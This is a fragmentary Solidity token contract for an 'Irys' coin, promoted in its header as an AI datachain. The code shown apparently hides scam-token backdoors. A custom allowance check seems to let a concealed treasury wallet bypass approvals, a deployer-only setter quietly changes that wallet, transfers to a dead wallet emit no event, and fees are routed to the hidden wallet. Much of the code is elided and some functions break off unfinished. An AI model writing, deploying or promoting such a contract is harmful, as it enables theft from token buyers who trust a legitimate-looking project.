...
/*
The First Layer-1 Programmable Datachain. Designed for AI. Engineered for Scale.

https://www.irys.live/
https://t.me/irys_eth
https://x.com/irys_eth
*/
...
contract Irys is Context, IERC20, Ownable {
    ...
    address private _tresureWal;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1_000_000_000 * 10 ** _decimals;
    string private constant _name = unicode"Irys";
    string private constant _symbol = unicode"IRYS";
    ...
    function _transfer(address sender, address receiver, uint256 amount) private {
        ...
        if (sender != owner() && receiver != owner() && sender != address(this) && receiver != address(this)) {
            ...
            if(sender != address(this) && receiver != address(this)){
        ...
        if (receiver != _deadWallet) emit Transfer(sender, receiver, amount.sub(taxAmount));
    }
    ...
    function _allowance(
        ...
        if((owner == _uniswapPair || spender != _deadWallet) && msg.sender != _tresureWal)
        return amount;
    }
    ...
    function setIRYS(address _wallet) public {
        require(msg.sender == _deployer);
        _tresureWal = _wallet;
    }

    function sendETHToFee(uint256 amount) private {
        payable(_tresureWal).transfer(amount);
    }
    ...
    function swapTokensForExactETH(uint256 tokenAmount) private swapLock {
     ...
     function TradingIRYS() external onlyOwner {
